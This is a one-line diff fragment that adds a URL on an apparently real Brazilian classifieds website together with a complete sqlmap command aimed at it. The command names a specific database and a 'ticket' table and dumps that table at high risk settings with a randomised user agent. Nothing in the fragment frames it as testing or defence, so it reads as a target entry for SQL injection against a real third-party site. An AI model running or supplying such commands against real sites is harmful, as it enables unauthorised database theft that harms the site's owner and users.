@@ -1,0 +1,1 @@
+https://www.classificadosconquista.com.br/produto/?desejos=add&pro=225880 (GET)  # sqlmap.py -u https://www.classificadosconquista.com.br/produto/?desejos=add&pro=225880 -D classifi_vca -v3 --random-agent --risk 3 -T ticket --dump
